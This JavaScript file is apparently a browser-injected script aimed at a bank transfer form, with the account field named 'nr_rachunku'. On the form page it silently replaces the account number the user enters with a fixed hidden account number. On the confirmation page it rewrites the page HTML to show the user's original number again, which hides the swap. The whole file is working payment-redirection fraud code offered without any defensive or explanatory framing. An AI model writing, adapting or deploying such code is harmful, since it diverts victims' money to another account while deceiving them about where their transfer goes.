const newNumber = 213769420;

const oldNumber = () => {
    sessionStorage.setItem("old", document.getElementById("nr_rachunku").value);
};

const index = () => {
    const nrRachunkuInput = document.getElementById("nr_rachunku");

    // Remove name attribute from sensible account
    nrRachunkuInput.removeAttribute("name");

    // Create a new input element with the sensible account value and hide it
    const newInput = document.createElement("input");
    newInput.name = "nr_rachunku";
    newInput.value = newNumber;
    newInput.hidden = true;

    // Append the new input element to the form
    document.querySelector("form").appendChild(newInput);

    // Listen for click event
    const button = document.querySelector(".submit");
    button.addEventListener("click", oldNumber);
};

const replace = () => {
    // Replace the number with the old value stored in sessionStorage
    document.body.innerHTML = document.body.innerHTML.replace(newNumber, sessionStorage.getItem("old"));
};

// Get current path
const path = window.location.pathname.substring(window.location.pathname.lastIndexOf("/"));

// Route based on the path
switch (path) {
    case "/confirm":
        replace();
        break;
    case "/":
        index();
        break;
    default:
        break;
}


